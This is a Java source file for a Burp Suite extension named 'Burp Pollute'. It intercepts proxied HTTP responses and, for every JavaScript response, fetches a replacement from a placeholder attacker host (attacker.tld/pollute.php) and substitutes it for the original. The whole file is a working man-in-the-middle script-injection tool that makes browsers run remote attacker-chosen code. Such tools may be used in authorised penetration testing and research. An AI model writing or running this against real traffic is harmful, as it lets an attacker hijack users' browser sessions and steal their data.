package burp;

import java.net.MalformedURLException;
import java.net.URL;

public final class BurpExtender implements IBurpExtender, IProxyListener {

    private IExtensionHelpers helpers;
    private IBurpExtenderCallbacks callbacks;
    public static final String POLLUTE_JS = "https://attacker.tld/pollute.php?url=";

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("Burp Pollute");
        callbacks.registerProxyListener(this);
    }

    @Override
    public void processProxyMessage(final boolean messageIsRequest, final IInterceptedProxyMessage message) {
        if (!messageIsRequest) {
            polluteJS(message.getMessageInfo());
        }
    }

    private void polluteJS(final IHttpRequestResponse httpRequestResponse) {
        byte[] originalResponse = httpRequestResponse.getResponse();
        IResponseInfo responseInfo = this.helpers.analyzeResponse(originalResponse);

        String inferredMimeType = responseInfo.getInferredMimeType();
        if (inferredMimeType.isEmpty()) {
            inferredMimeType = responseInfo.getStatedMimeType();
        }
        inferredMimeType = inferredMimeType.toLowerCase();

        if (inferredMimeType.contains("script")) {
            try {
                URL scriptURL = this.helpers.analyzeRequest(httpRequestResponse).getUrl();
                this.callbacks.printOutput("Pollute Response: " + scriptURL);
                URL polluteURL = new URL(POLLUTE_JS);
                IHttpService polluteHttpService = this.helpers.buildHttpService(polluteURL.getHost(), polluteURL.getPort(), polluteURL.getProtocol());
                byte[] polluteRequest = this.helpers.buildHttpRequest(new URL(POLLUTE_JS + scriptURL));
                IHttpRequestResponse modifiedRequestResponse = this.callbacks.makeHttpRequest(polluteHttpService, polluteRequest);
                httpRequestResponse.setResponse(modifiedRequestResponse.getResponse());
            } catch (MalformedURLException ex) {
            }
        }
    }
}
